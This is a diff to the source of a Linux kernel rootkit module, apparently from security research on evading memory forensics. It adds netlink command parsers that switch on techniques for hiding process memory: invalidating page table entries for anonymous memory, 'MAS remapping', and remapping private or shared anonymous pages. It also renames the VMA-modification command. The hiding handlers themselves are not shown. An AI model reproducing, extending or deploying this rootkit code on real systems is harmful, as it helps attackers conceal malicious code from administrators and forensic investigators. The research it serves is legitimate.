@@ -1,6 +1,8 @@
 /* rootkit_module.c -- installs and sets up rootkit
  *
  * Copyright (C) 2019 Patrick Reichenberger
+ * Additional Authors:
+ * Frank Block, ERNW Research GmbH <fblock@ernw.de>
  *
  * This program is free software; you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -21,6 +23,7 @@
 #include <net/sock.h>
 #include <linux/ftrace.h>
 #include <linux/vmalloc.h>
+#include <linux/kernel.h>
 
 #include "rootkit_module.h"
 #include "debug.h"
@@ -113,6 +116,115 @@ void reset_global_ctl_vars(void) {
     memset(benlibpath, 0, 64);
     mode = -1;
 }
+
+
+/** pte_invalidate_anon_parser - command parser for invalidating PTEs for anonymous memory
+ *  @token: command message
+ *  @msg_pp: command message
+ *  @pid: pid
+ *
+ *  Parses the command and instructs hiding for PTE invalidate technique.
+ */
+void pte_invalidate_anon_parser(char *token, char **msg_pp, int pid) {
+    reset_global_ctl_vars();
+
+    /* Determine hide/reveal mode */
+    if (!strcmp(token, "pteinvalidateanon")) {
+        mode = HIDE;
+    } else {
+        mode = REVEAL;
+    }
+
+    char * vm_start_string;
+    // const char* vm_start_string;
+
+    strsep(msg_pp, "\"");
+    vm_start_string = strsep(msg_pp, "\"");
+    unsigned long long vm_start = 0;
+    if(vm_start_string){
+        // strcat(mallibpath, token);
+        log_print(LOG_ERR, "vm_start is: %s", vm_start_string);
+        // kstrtoull(vm_start_string, 16, vm_start);
+        vm_start = simple_strtoull(vm_start_string, NULL, 16);
+        if (vm_start <= 0){
+            log_print(LOG_ERR, "Error during conversion.");
+            return;
+        }
+        log_print(LOG_ERR, "vm_start after conversion: %llx", vm_start);
+    } else {
+        log_print(LOG_ERR, "Error in parsing vm_start.");
+        return;
+    }
+
+#ifdef MANUAL_MODE
+    /* If the manual mode is activated, invalidate the PTEs */
+    pte_invalidate_anon_handler(vm_start, pid, mode);
+    /* Answer not necessary, can be used for acknowledgement */
+    //netlink_send_msg(pid, "Command received.");
+#else
+    /* Otherwise, set the enable bit to allow the hook function to use the global control values and specify technique. */
+    // TODO adjust for this technique
+    // enable_tech = 1;
+    // technique = INVALIDATE_PTES;
+    /* Answer not necessary, can be used for acknowledgement */
+    //netlink_send_msg(pid, "Automatic hiding started..");
+#endif
+}
+
+
+/** mas_remapping_parser - handler for MAS remapping
+ *  @token: command message
+ *  @msg_pp: command message
+ *  @pid: pid
+ *
+ *  Parses the command and either does or undoes MAS remapping.
+ */
+void mas_remapping_parser(char *token, char **msg_pp, int pid) {
+    reset_global_ctl_vars();
+
+    /* Determine hide/reveal mode */
+    if (!strcmp(token, "masremapping")) {
+        mode = HIDE;
+    } else {
+        mode = REVEAL;
+    }
+
+    char * vm_start_string;
+    // const char* vm_start_string;
+
+    strsep(msg_pp, "\"");
+    vm_start_string = strsep(msg_pp, "\"");
+    unsigned long long vm_start = 0;
+    if(vm_start_string){
+        // strcat(mallibpath, token);
+        log_print(LOG_ERR, "vm_start is: %s", vm_start_string);
+        // kstrtoull(vm_start_string, 16, vm_start);
+        vm_start = simple_strtoull(vm_start_string, NULL, 16);
+        if (vm_start <= 0){
+            log_print(LOG_ERR, "Error during conversion.");
+            return;
+        }
+        log_print(LOG_ERR, "vm_start after conversion: %llx", vm_start);
+    } else {
+        log_print(LOG_ERR, "Error in parsing vm_start.");
+        return;
+    }
+
+#ifdef MANUAL_MODE
+    /* If the manual mode is activated, invalidate the PTEs */
+    mas_remapping_handler(vm_start, pid, mode);
+    /* Answer not necessary, can be used for acknowledgement */
+    //netlink_send_msg(pid, "Command received.");
+#else
+    /* Otherwise, set the enable bit to allow the hook function to use the global control values and specify technique. */
+    // TODO adjust for this technique
+    // enable_tech = 1;
+    // technique = INVALIDATE_PTES;
+    /* Answer not necessary, can be used for acknowledgement */
+    //netlink_send_msg(pid, "Automatic hiding started..");
+#endif
+}
+
 
 /** pte_invalidate_parser - command parser for invalidating PTEs
  *  @token: command message
@@ -219,6 +331,73 @@ void pte_remap_parser(char *token, char **msg_pp, int pid) {
     }
 }
 
+
+void pte_remap_parser_anon(char *token, char **msg_pp, int pid) {
+    reset_global_ctl_vars();
+    MemoryMode mem_mode;
+
+    if (!strcmp(token, "pteremapanon_p")) {
+        log_print(LOG_INFO, "Starting PTE remapping with private anonymous memory.");
+        mode = HIDE;
+        mem_mode = ANON_PRIVATE_MEMORY;
+    }
+    else if (!strcmp(token, "pteremapanon_s")){
+        log_print(LOG_INFO, "Starting PTE remapping with shared anonymous memory.");
+        mode = HIDE;
+        mem_mode = ANON_SHARED_MEMORY;
+    }
+    else if (!strcmp(token, "pteresetanon_p")){
+        log_print(LOG_INFO, "Restoring PTE remapping for private anonymous memory.");
+        mode = REVEAL;
+        mem_mode = ANON_PRIVATE_MEMORY;
+    }
+    else if (!strcmp(token, "pteresetanon_s")){
+        log_print(LOG_INFO, "Restoring PTE remapping for shared anonymous memory.");
+        mode = REVEAL;
+        mem_mode = ANON_SHARED_MEMORY;
+    }
+    else{
+        log_print(LOG_ERR, "Unknown command: %s\n.", token);
+        return;
+    }
+
+        char * vm_start_string;
+        // const char* vm_start_string;
+
+        strsep(msg_pp, "\"");
+        vm_start_string = strsep(msg_pp, "\"");
+        unsigned long long vm_start = 0;
+        if(vm_start_string){
+            // strcat(mallibpath, token);
+            log_print(LOG_ERR, "vm_start is: %s", vm_start_string);
+            // kstrtoull(vm_start_string, 16, vm_start);
+            vm_start = simple_strtoull(vm_start_string, NULL, 16);
+            if (vm_start <= 0){
+                log_print(LOG_ERR, "Error during conversion.");
+                return;
+            }
+            log_print(LOG_ERR, "vm_start after conversion: %llx", vm_start);
+        } else {
+            log_print(LOG_ERR, "Error in parsing malicious library path.");
+            return;
+        }
+
+#ifdef MANUAL_MODE
+        /* If the manual mode is activated, remap the pages */
+        pte_remap_handler_anon(vm_start, pid, mode, mem_mode);
+        /* Answer not necessary, can be used for acknowledgement */
+        //netlink_send_msg(pid, "Command received.");
+#else
+        /* Otherwise, set the enable bit to allow the hook function to use the global control values and specify technique. */
+        // TODO adjust for this technique
+        //enable_tech = 1;
+        //technique = REMAP_PAGES;
+        /* Answer not necessary, can be used for acknowledgement */
+        //netlink_send_msg(pid, "Automatic hiding started..");
+#endif
+}
+
+
 /** vma_delete_parser - command parser for deleting VMAs
  *  @token: command message
  *  @msg_pp: command message
@@ -293,7 +472,7 @@ void vma_delete_parser(char* token, char** msg_pp, int pid) {
 void vma_modify_parser(char* token, char** msg_pp, int pid) {
     reset_global_ctl_vars();
 
-    if (!strcmp(token, "vmamodify")) {
+    if (!strcmp(token, "vmaremapping")) {
         mode = HIDE;
         log_print(LOG_INFO, "Change VMAs boundaries.");
 
@@ -445,13 +624,19 @@ void user_netlink_rcv_msg(struct sk_buff *skb) {
     token = strsep(msg_pp, " ");
     if (*token == '\0') {
         return;
-    } else if(!strcmp(token, "pteinvalidate") || !strcmp(token, "pterestore")) {
+    } else if(strcmp(token, "pteinvalidate") == 0 || strcmp(token, "pterestore") == 0) {
         pte_invalidate_parser(token, msg_pp, pid);
-    } else if(!strcmp(token, "pteremap") || !strcmp(token, "ptereset")) {
+    } else if(strcmp(token, "pteinvalidateanon") == 0 || strcmp(token, "pterestoreanon") == 0) {
+        pte_invalidate_anon_parser(token, msg_pp, pid);
+    } else if(strcmp(token, "masremapping") == 0 || strcmp(token, "masremapping_reset") == 0) {
+        mas_remapping_parser(token, msg_pp, pid);
+    } else if(strcmp(token, "pteremap") == 0 || strcmp(token, "ptereset") == 0) {
         pte_remap_parser(token, msg_pp, pid);
+    } else if(strcmp(token, "pteremapanon_p") == 0 || strcmp(token, "pteremapanon_s") == 0 || strcmp(token, "pteresetanon_p") == 0 || strcmp(token, "pteresetanon_s") == 0) {
+        pte_remap_parser_anon(token, msg_pp, pid);
     } else if(!strcmp(token, "vmadelete") || !strcmp(token, "vmarestore")) {
         vma_delete_parser(token, msg_pp, pid);
-    } else if(!strcmp(token, "vmamodify") || !strcmp(token, "vmareset")) {
+    } else if(!strcmp(token, "vmaremapping") || !strcmp(token, "vmareset")) {
         vma_modify_parser(token, msg_pp, pid);
     } else if(!strcmp(token, "ptevmadelete") || !strcmp(token, "ptevmarestore")) {
         pte_vma_delete_parser(token, msg_pp, pid);
